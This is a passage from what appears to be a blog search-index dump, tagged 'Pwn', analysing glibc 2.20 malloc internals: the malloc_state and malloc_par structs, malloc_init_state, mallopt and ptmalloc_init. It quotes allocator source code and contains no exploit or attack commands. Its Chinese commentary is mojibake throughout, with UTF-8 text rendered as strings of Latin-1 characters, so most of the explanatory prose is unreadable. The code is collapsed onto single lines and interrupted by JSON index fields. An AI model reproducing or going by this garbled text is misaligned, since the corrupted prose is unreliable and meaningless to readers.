‡å¿—è¯¥åˆ†é…åŒºä¸­å·²ç»æ²¡æœ‰fast chunkï¼Œå› ä¸ºå‡½æ•°malloc_consolidate()ä¼šåˆå¹¶æ‰€æœ‰çš„fast binsä¸­çš„chunkã€‚clear_fastchunkså®åªä¼šåœ¨å‡½æ•°malloc_consolidate()ä¸­è°ƒç”¨ã€‚å½“æœ‰fast chunkåŠ å…¥fast binsæ—¶ï¼Œå°±æ˜¯è°ƒç”¨set_fastchunkså®æ ‡è¯†åˆ†é…åŒºçš„fast binsä¸­å­˜åœ¨fast chunkã€‚ Flagsçš„bit1å¦‚æœä¸º0ï¼Œè¡¨ç¤ºMORCOREè¿”å›è¿ç»­è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œbit1ä¸º1ï¼Œè¡¨ç¤ºMORCOREè¿”å›éè¿ç»­è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå¯¹äºä¸»åˆ†é…åŒºï¼ŒMORECOREå…¶å®ä¸ºsbr()ï¼Œé»˜è®¤è¿”å›è¿ç»­è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå¯¹äºéä¸»åˆ†é…åŒºï¼Œä½¿ç”¨mmap()åˆ†é…å¤§å—è™šæ‹Ÿå†…å­˜ï¼Œç„¶åè¿›è¡Œåˆ‡åˆ†æ¥æ¨¡æ‹Ÿä¸»åˆ†é…åŒºçš„è¡Œä¸ºï¼Œè€Œé»˜è®¤æƒ…å†µä¸‹mmapæ˜ å°„åŒºåŸŸæ˜¯ä¸ä¿è¯è™šæ‹Ÿåœ°å€ç©ºé—´è¿ç»­çš„ï¼Œæ‰€ä»¥éä¸»åˆ†é…åŒºé»˜è®¤åˆ†é…éè¿ç»­è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚ fastbinsYæ˜¯æœ‰åä¸ªå…ƒç´ çš„æ•°ç»„ï¼Œå­˜æ”¾äº†fastbinçš„é“¾è¡¨å¤´ã€‚ topæŒ‡å‘äº†è¯¥åˆ†é…åŒºçš„top chunkã€‚ last_remainderæ˜¯ä¸€ä¸ªchunkæŒ‡é’ˆï¼Œåˆ†é…åŒºä¸Šæ¬¡åˆ†é…small chunkæ—¶ï¼Œä»ä¸€ä¸ªchunkä¸­åˆ†è£‚å‡ºä¸€ä¸ªsmall chunkè¿”å›ç»™ç”¨æˆ·ï¼Œåˆ†è£‚åçš„å‰©ä½™éƒ¨åˆ†å½¢æˆä¸€ä¸ªchunkï¼Œlast_remainderå°±æ˜¯æŒ‡å‘çš„è¿™ä¸ªchunkã€‚ binsæ˜¯å½“å‰åˆ†é…åŒºå­˜å‚¨unstored binï¼Œsmall binså’Œlarge binsçš„chunké“¾è¡¨å¤´çš„æ•°ç»„ã€‚ æ³¨æ„ï¼šè®¡ç®—å‡ºæ¥æ•°ç»„æœ‰254ä¸ªå…ƒç´ ï¼Œä¹‹å‰binå¤´è¢«æè¿°ä¸ºä¸€ä¸ªmalloc chunkä½†æ˜¯è¦é“¾æ¥chunkï¼Œæˆ‘ä»¬åªéœ€è¦fdå’Œbkï¼Œå¯¹äºlarge binæ¥è¯´åªéœ€è¦fd_nextsizeå’Œbk_nextsizeï¼Œæ‰€ä»¥åªè¦ä¸ºæŒ‡é’ˆç”³è¯·ç©ºé—´å³å¯ï¼Œå…¶ä½™åŸŸéƒ½æ˜¯è¢«å¤ç”¨çš„ binmapå­—æ®µæ˜¯ä¸€ä¸ªintæ•°ç»„ï¼Œå…±128ä½ã€‚ptmallocç”¨ä¸€ä¸ªbitæ¥æ ‡è¯†è¯¥bitå¯¹åº”çš„binä¸­æ˜¯å¦åŒ…å«ç©ºé—²chunkã€‚ nextå­—æ®µç”¨äºå°†åˆ†é…åŒºä»¥å•å‘é“¾è¡¨é“¾æ¥èµ·æ¥ã€‚ next_freeå­—æ®µç©ºé—²çš„åˆ†é…åŒºé“¾æ¥åœ¨å•å‘é“¾è¡¨ä¸­ï¼Œåªæœ‰åœ¨å®šä¹‰äº†PER_THREADçš„æƒ…å†µä¸‹æ‰å®šä¹‰è¯¥å­—æ®µã€‚ system_memå­—æ®µè®°å½•äº†å½“å‰åˆ†é…åŒºå·²ç»åˆ†é…çš„å†…å­˜å¤§å°ã€‚ max_system_memè®°å½•äº†å½“å‰åˆ†é…åŒºæœ€å¤§èƒ½åˆ†é…çš„å†…å­˜å¤§å°ã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:1","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#malloc_state"},{"categories":["Pwning"],"content":"malloc_par struct malloc_par{ /* Tunable parameters */ unsigned long trim_threshold; INTERNAL_SIZE_T top_pad; INTERNAL_SIZE_T mmap_threshold; INTERNAL_SIZE_T arena_test; INTERNAL_SIZE_T arena_max; /* Memory map support */ int n_mmaps; int n_mmaps_max; int max_n_mmaps; /* the mmap_threshold is dynamic, until the user sets it manually, at which point we need to disable any dynamic behavior. */ int no_dyn_threshold; /* Statistics */ INTERNAL_SIZE_T mmapped_mem; /*INTERNAL_SIZE_T sbrked_mem;*/ /*INTERNAL_SIZE_T max_sbrked_mem;*/ INTERNAL_SIZE_T max_mmapped_mem; INTERNAL_SIZE_T max_total_mem; /* only kept for NO_THREADS */ /* First address handed out by MORECORE/sbrk. */ char *sbrk_base;}; malloc_parè®°å½•äº†ä¸€äº›å‚æ•°å’Œç»Ÿè®¡ä¿¡æ¯ï¼Œtrim_thresholdå­—æ®µè¡¨ç¤ºæ”¶ç¼©é˜ˆå€¼ï¼Œé»˜è®¤ä¸º128KBï¼Œå½“æ¯ä¸ªåˆ†é…åŒºçš„top chunkå¤§å°å¤§äºè¿™ä¸ªé˜ˆå€¼æ—¶ï¼Œåœ¨ä¸€å®šçš„æ¡ä»¶ä¸‹ï¼Œè°ƒç”¨freeæ—¶ä¼šæ”¶ç¼©å†…å­˜ï¼Œå‡å°top chunkçš„å¤§å°ã€‚ç”±äºmmapåˆ†é…é˜ˆå€¼çš„åŠ¨æ€è°ƒæ•´ï¼Œåœ¨freeæ—¶å¯èƒ½å°†æ”¶ç¼©é˜ˆå€¼ä¿®æ”¹ä¸ºmmapåˆ†é…é˜ˆå€¼çš„2å€ï¼Œåœ¨64ä½ç³»ç»Ÿä¸Šï¼Œmmapåˆ†é…é˜ˆå€¼æœ€å¤§å€¼ä¸º32MBï¼Œæ‰€ä»¥æ”¶ç¼©é˜ˆå€¼çš„æœ€å¤§å€¼ä¸º64MBï¼Œåœ¨32ä½ç³»ç»Ÿä¸Šï¼Œmmapåˆ†é…é˜ˆå€¼æœ€å¤§å€¼ä¸º512KBï¼Œæ‰€ä»¥æ”¶ç¼©é˜ˆå€¼çš„æœ€å¤§å€¼ä¸º1MBã€‚æ”¶ç¼©é˜ˆå€¼å¯ä»¥é€šè¿‡å‡½æ•°mallopt()è¿›è¡Œè®¾ç½®ã€‚ top_padï¼šè¡¨ç¤ºåœ¨åˆ†é…å†…å­˜æ—¶æ˜¯å¦æ·»åŠ é¢å¤–çš„padï¼Œé»˜è®¤è¯¥å­—æ®µä¸º0ã€‚ mmap_thresholdï¼šè¡¨ç¤ºmmapåˆ†é…é˜ˆå€¼ï¼Œé»˜è®¤å€¼ä¸º128KBï¼Œåœ¨32ä½ç³»ç»Ÿä¸Šæœ€å¤§å€¼ä¸º512KBï¼Œ64ä½ç³»ç»Ÿä¸Šçš„æœ€å¤§å€¼ä¸º32MBï¼Œç”±äºé»˜è®¤å¼€å¯mmapåˆ†é…é˜ˆå€¼åŠ¨æ€è°ƒæ•´ï¼Œè¯¥å­—æ®µçš„å€¼ä¼šåŠ¨æ€ä¿®æ”¹ï¼Œä½†ä¸ä¼šè¶…è¿‡æœ€å¤§å€¼ã€‚ arena_testå’Œarena_maxç”¨äºPER_THREADä¼˜åŒ–ï¼Œåœ¨32ä½ç³»ç»Ÿä¸Šarena_testé»˜è®¤å€¼ä¸º2ï¼Œ64ä½ç³»ç»Ÿä¸Šçš„é»˜è®¤å€¼ä¸º8ï¼Œå½“æ¯ä¸ªè¿›ç¨‹çš„åˆ†é…åŒºæ•°é‡å°äºç­‰äºarena_testæ—¶ï¼Œä¸ä¼šé‡ç”¨å·²æœ‰çš„åˆ†é…åŒºã€‚ä¸ºäº†é™åˆ¶åˆ†é…åŒºçš„æ€»æ•°ï¼Œç”¨arena_maxæ¥ä¿å­˜åˆ†é…åŒºçš„æœ€å¤§æ•°é‡ï¼Œå½“ç³»ç»Ÿä¸­çš„åˆ†é…åŒºæ•°é‡è¾¾åˆ°arena_maxï¼Œå°±ä¸ä¼šå†åˆ›å»ºæ–°çš„åˆ†é…åŒºï¼Œåªä¼šé‡ç”¨å·²æœ‰çš„åˆ†é…åŒºã€‚è¿™ä¸¤ä¸ªå­—æ®µéƒ½å¯ä»¥ä½¿ç”¨mallopt()å‡½æ•°è®¾ç½®ã€‚ n_mmapsï¼šè¡¨ç¤ºå½“å‰è¿›ç¨‹ä½¿ç”¨mmap()å‡½æ•°åˆ†é…çš„å†…å­˜å—çš„ä¸ªæ•°ã€‚ n_mmaps_maxï¼šè¡¨ç¤ºè¿›ç¨‹ä½¿ç”¨mmap()å‡½æ•°åˆ†é…çš„å†…å­˜å—çš„æœ€å¤§æ•°é‡ï¼Œé»˜è®¤å€¼ä¸º65536ï¼Œå¯ä»¥ä½¿ç”¨mallopt()å‡½æ•°ä¿®æ”¹ã€‚ max_n_mmapsï¼šè¡¨ç¤ºå½“å‰è¿›ç¨‹ä½¿ç”¨mmap()å‡½æ•°åˆ†é…çš„å†…å­˜å—çš„æ•°é‡çš„æœ€å¤§å€¼ï¼Œæœ‰å…³ç³»n_mmaps \u003c= max_n_mmapsæˆç«‹ã€‚è¿™ä¸ªå­—æ®µæ˜¯ç”±äºmstats()å‡½æ•°è¾“å‡ºç»Ÿè®¡éœ€è¦è¿™ä¸ªå­—æ®µã€‚ no_dyn_thresholdï¼šè¡¨ç¤ºæ˜¯å¦å¼€å¯mmapåˆ†é…é˜ˆå€¼åŠ¨æ€è°ƒæ•´æœºåˆ¶ï¼Œé»˜è®¤å€¼ä¸º0ï¼Œä¹Ÿå°±æ˜¯é»˜è®¤å¼€å¯mmapåˆ†é…é˜ˆå€¼åŠ¨æ€è°ƒæ•´æœºåˆ¶ã€‚ pagesizeï¼šè¡¨ç¤ºç³»ç»Ÿçš„é¡µå¤§å°ï¼Œé»˜è®¤ä¸º4KBã€‚ mmapped_memå’Œmax_mmapped_meméƒ½ç”¨äºç»Ÿè®¡mmapåˆ†é…çš„å†…å­˜å¤§å°ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸¤ä¸ªå­—æ®µçš„å€¼ç›¸ç­‰ï¼Œmax_mmapped_memç”¨äºmstats()å‡½æ•°ã€‚ max_total_memï¼šåœ¨å•çº¿ç¨‹æƒ…å†µä¸‹ç”¨äºç»Ÿè®¡è¿›ç¨‹åˆ†é…çš„å†…å­˜æ€»æ•°ã€‚ sbrk_baseï¼šè¡¨ç¤ºå †çš„èµ·å§‹åœ°å€ã€‚ /* There are several instances of this struct (\"arenas\") in this malloc. If you are adapting this malloc in a way that does NOT use a static or mmapped malloc_state, you MUST explicitly zero-fill it before using. This malloc relies on the property that malloc_state is initialized to all zeroes (as is true of C statics). */static struct malloc_state main_arena ={ .mutex = MUTEX_INITIALIZER, .next = \u0026main_arena};/* There is only one instance of the malloc parameters. */static struct malloc_par mp_ ={ .top_pad = DEFAULT_TOP_PAD, .n_mmaps_max = DEFAULT_MMAP_MAX, .mmap_threshold = DEFAULT_MMAP_THRESHOLD, .trim_threshold = DEFAULT_TRIM_THRESHOLD,#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8)) .arena_test = NARENAS_FROM_NCORES (1)};/* Non public mallopt parameters. */#define M_ARENA_TEST -7#define M_ARENA_MAX -8/* Maximum size of memory handled in fastbins. */static INTERNAL_SIZE_T global_max_fast; main_arenaè¡¨ç¤ºä¸»åˆ†é…åŒºï¼Œä»»ä½•è¿›ç¨‹æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªå…¨å±€çš„ä¸»åˆ†é…åŒºï¼Œmp_æ˜¯å…¨å±€å”¯ä¸€çš„ä¸€ä¸ªmalloc_parå®ä¾‹ï¼Œç”¨äºç®¡ç†å‚æ•°å’Œç»Ÿè®¡ä¿¡æ¯ï¼Œglobal_max_fastå…¨å±€å˜é‡è¡¨ç¤ºfast binsä¸­æœ€å¤§çš„chunkå¤§å°ã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:2","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#malloc_par"},{"categories":["Pwning"],"content":"malloc_init_state /* Initialize a malloc_state struct. This is called only from within malloc_consolidate, which needs be called in the same contexts anyway. It is never called directly outside of malloc_consolidate because some optimizing compilers try to inline it at all call points, which turns out not to be an optimization at all. (Inlining it in malloc_consolidate is fine though.) */static voidmalloc_init_state (mstate av){ int i; mbinptr bin; /* Establish circular links for normal bins */ for (i = 1; i \u003c NBINS; ++i) { bin = bin_at (av, i); bin-\u003efd = bin-\u003ebk = bin; }#if MORECORE_CONTIGUOUS if (av != \u0026main_arena)#endif set_noncontiguous (av); if (av == \u0026main_arena) set_max_fast (DEFAULT_MXFAST); av-\u003eflags |= FASTCHUNKS_BIT; av-\u003etop = initial_top (av);} malloc_init_stateå°†åˆ†é…åŒºä¸­çš„biné“¾è¡¨å¤´éƒ½æŒ‡å‘è‡ªèº«ã€‚åœ¨åˆå§‹åŒ–ä¸»åˆ†é…åŒºæ—¶ï¼Œavé»˜è®¤ä¸º0ï¼Œå³é»˜è®¤åˆ†é…è¿ç»­çš„ç©ºé—´(ä¹Ÿä»…æœ‰ä¸»åˆ†é…åŒºæ‰èƒ½è¿™æ ·åš)ï¼Œå¯¹äºéä¸»åˆ†é…åŒºï¼Œéœ€è¦è®¾ç½®åˆ†é…éè¿ç»­çš„ç©ºé—´ã€‚å¦‚æœåˆå§‹åŒ–çš„æ˜¯ä¸»åˆ†é…åŒºï¼Œéœ€è¦è®¾ç½®fast binsä¸­æœ€å¤§chunkå¤§å°ï¼Œç”±äºä¸»åˆ†é…åŒºåªæœ‰ä¸€ä¸ªï¼Œå¹¶ä¸”ä¸€å®šæ˜¯æœ€å…ˆåˆå§‹åŒ–ï¼Œè¿™å°±ä¿è¯äº†å¯¹å…¨å±€å˜é‡global_max_faståªåˆå§‹åŒ–äº†ä¸€æ¬¡ï¼Œåªè¦è¯¥å…¨å±€å˜é‡çš„å€¼é0ï¼Œä¹Ÿå°±æ„å‘³ç€ä¸»åˆ†é…åŒºåˆå§‹åŒ–äº†ã€‚æœ€ååˆå§‹åŒ–top chunkã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:3","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#malloc_init_state"},{"categories":["Pwning"],"content":"__libc_mallopt() int__libc_mallopt (int param_number, int value){ mstate av = \u0026main_arena; int res = 1; if (__malloc_initialized \u003c 0) ptmalloc_init (); (void) mutex_lock (\u0026av-\u003emutex); /* Ensure initialization/consolidation */ malloc_consolidate (av); LIBC_PROBE (memory_mallopt, 2, param_number, value); switch (param_number) { case M_MXFAST: if (value \u003e= 0 \u0026\u0026 value \u003c= MAX_FAST_SIZE) { LIBC_PROBE (memory_mallopt_mxfast, 2, value, get_max_fast ()); set_max_fast (value); } else res = 0; break; case M_TRIM_THRESHOLD: LIBC_PROBE (memory_mallopt_trim_threshold, 3, value, mp_.trim_threshold, mp_.no_dyn_threshold); mp_.trim_threshold = value; mp_.no_dyn_threshold = 1; break; case M_TOP_PAD: LIBC_PROBE (memory_mallopt_top_pad, 3, value, mp_.top_pad, mp_.no_dyn_threshold); mp_.top_pad = value; mp_.no_dyn_threshold = 1; break; case M_MMAP_THRESHOLD: /* Forbid setting the threshold too high. */ if ((unsigned long) value \u003e HEAP_MAX_SIZE / 2) res = 0; else { LIBC_PROBE (memory_mallopt_mmap_threshold, 3, value, mp_.mmap_threshold, mp_.no_dyn_threshold); mp_.mmap_threshold = value; mp_.no_dyn_threshold = 1; } break; case M_MMAP_MAX: LIBC_PROBE (memory_mallopt_mmap_max, 3, value, mp_.n_mmaps_max, mp_.no_dyn_threshold); mp_.n_mmaps_max = value; mp_.no_dyn_threshold = 1; break; case M_CHECK_ACTION: LIBC_PROBE (memory_mallopt_check_action, 2, value, check_action); check_action = value; break; case M_PERTURB: LIBC_PROBE (memory_mallopt_perturb, 2, value, perturb_byte); perturb_byte = value; break; case M_ARENA_TEST: if (value \u003e 0) { LIBC_PROBE (memory_mallopt_arena_test, 2, value, mp_.arena_test); mp_.arena_test = value; } break; case M_ARENA_MAX: if (value \u003e 0) { LIBC_PROBE (memory_mallopt_arena_max, 2, value, mp_.arena_max); mp_.arena_max = value; } break; } (void) mutex_unlock (\u0026av-\u003emutex); return res;}libc_hidden_def (__libc_mallopt) åœ¨mallopt()å‡½æ•°é…ç½®å‰ï¼Œéœ€è¦æ£€æŸ¥ä¸»åˆ†é…åŒºæ˜¯å¦åˆå§‹åŒ–äº†ï¼Œå¦‚æœæ²¡æœ‰åˆå§‹åŒ–ï¼Œè°ƒç”¨ptmalloc_init()å‡½æ•°åˆå§‹åŒ–ptmallocï¼Œç„¶åè·å¾—ä¸»åˆ†é…åŒºçš„é”ï¼Œè°ƒç”¨malloc_consolidate()å‡½æ•°ï¼Œmalloc_consolidate()å‡½æ•°ä¼šåˆ¤æ–­ä¸»åˆ†é…åŒºæ˜¯å¦å·²ç»åˆå§‹åŒ–ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™åˆå§‹åŒ–ä¸»åˆ†é…åŒºã€‚åŒæ—¶æˆ‘ä»¬ä¹Ÿçœ‹åˆ°ï¼Œmp_éƒ½æ²¡æœ‰é”ï¼Œå¯¹mp_ä¸­å‚æ•°å­—æ®µçš„ä¿®æ”¹ï¼Œæ˜¯é€šè¿‡ä¸»åˆ†é…åŒºçš„é”æ¥åŒæ­¥çš„ã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:4","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#__libc_mallopt"},{"categories":["Pwning"],"content":"ptmalloc_init() static voidptmalloc_init (void){ if (__malloc_initialized \u003e= 0) return; __malloc_initialized = 0; ptmalloc_init()ç”¨äºåˆå§‹åŒ–ptmallocï¼Œå®ƒé¦–å…ˆæ£€æŸ¥å…¨å±€å˜é‡__malloc_initializedæ˜¯å¦å¤§äºç­‰äº0ï¼Œå¦‚æœè¯¥å€¼å¤§äº0ï¼Œè¡¨ç¤ºptmallocå·²ç»åˆå§‹åŒ–ï¼Œå¦‚æœè¯¥å€¼ä¸º0ï¼Œè¡¨ç¤ºptmallocæ­£åœ¨åˆå§‹åŒ–ï¼Œå…¨å±€å˜é‡__malloc_initializedç”¨æ¥ä¿è¯å…¨å±€åªåˆå§‹åŒ–ptmallocä¸€æ¬¡ã€‚ #ifdef SHARED /* In case this libc copy is in a non-default namespace, never use brk. Likewise if dlopened from statically linked program. */Dl_info di; struct link_map *l; if (_dl_open_hook != NULL || (_dl_addr (ptmalloc_init, \u0026di, \u0026l, NULL) != 0 \u0026\u0026 l-\u003el_ns != LM_ID_BASE)) __morecore = __failing_morecore;#endif Ptmallocéœ€è¦ä¿è¯åªæœ‰ä¸»åˆ†é…åŒºæ‰èƒ½ä½¿ç”¨sbrk()åˆ†é…è¿ç»­è™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œå¦‚æœæœ‰å¤šä¸ªåˆ†é…åŒºä½¿ç”¨sbrk()å°±ä¸èƒ½è·å¾—è¿ç»­çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹Glibcåº“éƒ½æ˜¯ä»¥åŠ¨æ€é“¾æ¥åº“çš„å½¢å¼åŠ è½½çš„ï¼Œå¤„äºé»˜è®¤å‘½åç©ºé—´ï¼Œå¤šä¸ªè¿›ç¨‹å…±ç”¨Glibcåº“ï¼ŒGlibcåº“ä»£ç æ®µåœ¨å†…å­˜ä¸­åªæœ‰ä¸€ä»½æ‹·è´ï¼Œæ•°æ®æ®µåœ¨æ¯ä¸ªç”¨æˆ·è¿›ç¨‹éƒ½æœ‰ä¸€ä»½æ‹·è´ã€‚ä½†å¦‚æœGlibcåº“ä¸åœ¨é»˜è®¤åå­—ç©ºé—´ï¼Œæˆ–æ˜¯ç”¨æˆ·ç¨‹åºæ˜¯é™æ€ç¼–è¯‘çš„å¹¶è°ƒç”¨äº†dlopenå‡½æ•°åŠ è½½Glibcåº“ä¸­çš„ptamalloc_init()ï¼Œè¿™ç§æƒ…å†µä¸‹çš„ptmallocä¸å…è®¸ä½¿ç”¨sbrk()åˆ†é…å†…å­˜ï¼Œåªéœ€ä¿®æ”¹__morecoreå‡½æ•°æŒ‡é’ˆæŒ‡å‘__failing_morecoreå°±å¯ä»¥ç¦æ­¢ä½¿ç”¨sbrk()äº†ï¼Œ__morecoreé»˜è®¤æŒ‡å‘sbrk()ã€‚ tsd_key_create (\u0026arena_key, NULL); tsd_setspecific (arena_key, (void *) \u0026main_arena); thread_atfork (ptmalloc_lock_all, ptmalloc_unlock_all, ptmalloc_unlock_all2); const char *s = NULL; åˆå§‹åŒ–å…¨å±€é”list_lockï¼Œlist_lockä¸»è¦ç”¨äºåŒæ­¥åˆ†é…åŒºçš„å•å‘å¾ªç¯é“¾è¡¨ã€‚ç„¶ååˆ›å»ºçº¿ç¨‹ç§æœ‰å®ä¾‹arena_keyï¼Œè¯¥ç§æœ‰å®ä¾‹ä¿å­˜çš„æ˜¯åˆ†é…åŒºï¼ˆarenaï¼‰çš„malloc_stateå®ä¾‹æŒ‡é’ˆã€‚arena_keyæŒ‡å‘çš„å¯èƒ½æ˜¯ä¸»åˆ†é…åŒºçš„æŒ‡é’ˆï¼Œä¹Ÿå¯èƒ½æ˜¯éä¸»åˆ†é…åŒºçš„æŒ‡é’ˆï¼Œè¿™é‡Œå°†è°ƒç”¨ptmalloc_init()çš„çº¿ç¨‹çš„arena_keyç»‘å®šåˆ°ä¸»åˆ†é…åŒºä¸Šã€‚æ„å‘³ç€æœ¬çº¿ç¨‹é¦–é€‰ä»ä¸»åˆ†é…åŒºåˆ†é…å†…å­˜ã€‚ ç„¶åè°ƒç”¨thread_atfork()è®¾ç½®å½“å‰è¿›ç¨‹åœ¨forkå­çº¿ç¨‹ï¼ˆlinuxä¸‹çº¿ç¨‹æ˜¯è½»é‡çº§è¿›ç¨‹ï¼Œä½¿ç”¨ç±»ä¼¼forkè¿›ç¨‹çš„æœºåˆ¶åˆ›å»ºï¼‰æ—¶å¤„ç†mutexçš„å›è°ƒå‡½æ•°ï¼Œåœ¨æœ¬è¿›ç¨‹forkå­çº¿ç¨‹æ—¶ï¼Œè°ƒç”¨ptmalloc_lock_all()è·å¾—æ‰€æœ‰åˆ†é…åŒºçš„é”ï¼Œç¦æ­¢æ‰€æœ‰åˆ†é…åŒºåˆ†é…å†…å­˜ï¼Œå½“å­çº¿ç¨‹åˆ›å»ºå®Œæ¯•ï¼Œçˆ¶è¿›ç¨‹è°ƒç”¨ptmalloc_unlock_all()é‡æ–°unlockæ¯ä¸ªåˆ†é…åŒºçš„é”mutexï¼Œå­çº¿ç¨‹è°ƒç”¨ptmalloc_unlock_all2()é‡æ–°åˆå§‹åŒ–æ¯ä¸ªåˆ†é…åŒºçš„é”mutexã€‚ if (__glibc_likely (_environ != NULL)) { char **runp = _environ; char *envline; while (__builtin_expect ((envline = next_env_entry (\u0026runp)) != NULL, 0)) { size_t len = strcspn (envline, \"=\"); if (envline[len] != '=') /* This is a \"MALLOC_\" variable at the end of the string without a '=' character. Ignore it since otherwise we will access invalid memory below. */ continue; switch (len) { case 6: if (memcmp (envline, \"CHECK_\", 6) == 0) s = \u0026envline[7]; break; case 8: if (!__builtin_expect (__libc_enable_secure, 0)) { if (memcmp (envline, \"TOP_PAD_\", 8) == 0) __libc_mallopt (M_TOP_PAD, atoi (\u0026envline[9])); else if (memcmp (envline, \"PERTURB_\", 8) == 0) __libc_mallopt (M_PERTURB, atoi (\u0026envline[9])); } break; case 9: if (!__builtin_expect (__libc_enable_secure, 0)) { if (memcmp (envline, \"MMAP_MAX_\", 9) == 0) __libc_mallopt (M_MMAP_MAX, atoi (\u0026envline[10])); else if (memcmp (envline, \"ARENA_MAX\", 9) == 0) __libc_mallopt (M_ARENA_MAX, atoi (\u0026envline[10])); } break; case 10: if (!__builtin_expect (__libc_enable_secure, 0)) { if (memcmp (envline, \"ARENA_TEST\", 10) == 0) __libc_mallopt (M_ARENA_TEST, atoi (\u0026envline[11])); } break; case 15: if (!__builtin_expect (__libc_enable_secure, 0)) { if (memcmp (envline, \"TRIM_THRESHOLD_\", 15) == 0) __libc_mallopt (M_TRIM_THRESHOLD, atoi (\u0026envline[16])); else if (memcmp (envline, \"MMAP_THRESHOLD_\", 15) == 0) __libc_mallopt (M_MMAP_THRESHOLD, atoi (\u0026envline[16])); } break; default: break; } } } if (s \u0026\u0026 s[0]) { __libc_mallopt (M_CHECK_ACTION, (int) (s[0] - '0')); if (check_action != 0) __malloc_check_init (); } ä»ç¯å¢ƒå˜é‡ä¸­è¯»å–ç›¸åº”çš„é…ç½®å‚æ•°å€¼ï¼Œè¿™äº›å‚æ•°åŒ…æ‹¬MALLOC_TRIM_THRESHOLD_ï¼ŒMALLOC_TOP_PAD_ï¼ŒMALLOC_PERTURB_ï¼ŒMALLOC_MMAP_THRESHOLD_ï¼ŒMALLOC_CHECK_ï¼ŒMALLOC_MMAP_MAX_ï¼ŒMALLOC_ARENA_MAX,MALLOC_ ARENA_TEST,å¦‚æœè¿™äº›é€‰é¡¹ä¸­çš„æŸäº›é¡¹å­˜åœ¨ï¼Œè°ƒç”¨mallopt()å‡½æ•°è®¾ç½®ç›¸åº”çš„é€‰é¡¹ã€‚å¦‚æœè¿™æ®µç¨‹åºæ˜¯åœ¨Glibcåº“åˆå§‹åŒ–ä¸­æ‰§è¡Œçš„ï¼Œä¼šåšæ›´å¤šçš„å®‰å…¨æ£€æŸ¥å·¥ä½œã€‚ void (*hook) (void) = atomic_forced_read (__malloc_initialize_hook); if (hook != NULL) (*hook)(); __malloc_initialized = 1;} åœ¨ptmalloc_init()å‡½æ•°ç»“æŸå¤„ï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨__malloc_initialize_hookå‡½æ•°ï¼Œå¦‚æœå­˜åœ¨ï¼Œæ‰§è¡Œè¯¥hookå‡½æ•°ã€‚æœ€åå°†å…¨å±€å˜é‡__malloc_initializedè®¾ç½®ä¸º1ï¼Œè¡¨ç¤ºptmalloc_init()å·²ç»åˆå§‹åŒ–å®Œæˆã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:5","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#ptmalloc_init"},{"categories":["Pwning"],"content":"å¤šåˆ†é…åŒºç”±äºåªæœ‰ä¸€ä¸ªä¸»åˆ†é…åŒºä»å †ä¸­åˆ†é…å°å†…å­˜å—ï¼Œè€Œç¨å¤§çš„å†…å­˜å—éƒ½å¿…é¡»ä»mmapæ˜ å°„åŒºåŸŸåˆ†é…ï¼Œå¦‚æœæœ‰å¤šä¸ªçº¿ç¨‹éƒ½è¦åˆ†é…å°å†…å­˜å—ï¼Œä½†å¤šä¸ªçº¿ç¨‹æ˜¯ä¸èƒ½åŒæ—¶è°ƒç”¨sbrk()å‡½æ•°çš„ï¼Œå› ä¸ºåªæœ‰ä¸€ä¸ªå‡½æ•°è°ƒç”¨sbrk()æ—¶æ‰èƒ½ä¿è¯åˆ†é…çš„è™šæ‹Ÿåœ°å€ç©ºé—´æ˜¯è¿ç»­çš„ã€‚å¦‚æœå¤šä¸ªçº¿ç¨‹éƒ½ä»ä¸»åˆ†é…åŒºä¸­åˆ†é…å°å†…å­˜å—ï¼Œæ•ˆç‡å¾ˆä½æ•ˆã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œptmallocä½¿ç”¨éä¸»åˆ†é…åŒºæ¥æ¨¡æ‹Ÿä¸»åˆ†é…åŒºçš„åŠŸèƒ½ï¼Œéä¸»åˆ†é…åŒºåŒæ 